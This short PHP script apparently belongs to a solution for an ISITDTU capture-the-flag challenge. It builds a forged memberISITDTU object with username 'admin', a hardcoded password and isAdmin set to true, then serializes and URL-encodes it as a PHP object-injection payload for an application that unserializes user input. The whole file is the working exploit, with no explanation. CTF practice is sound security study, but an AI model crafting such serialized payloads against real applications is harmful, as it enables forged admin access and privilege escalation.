<?php
class memberISITDTU{
    private $username='admin';
    private $password='onsra';
    private $isAdmin=true;
    private $class = 'isitDtu';

    function __construct(){
        $this->class=new isitDtu();
    }
   

}
class Isitdtu {
    function encodeData(){
    }
}
$a = new memberISITDTU();
$c = serialize($a).PHP_EOL;

echo urlencode($c).PHP_EOL;

?>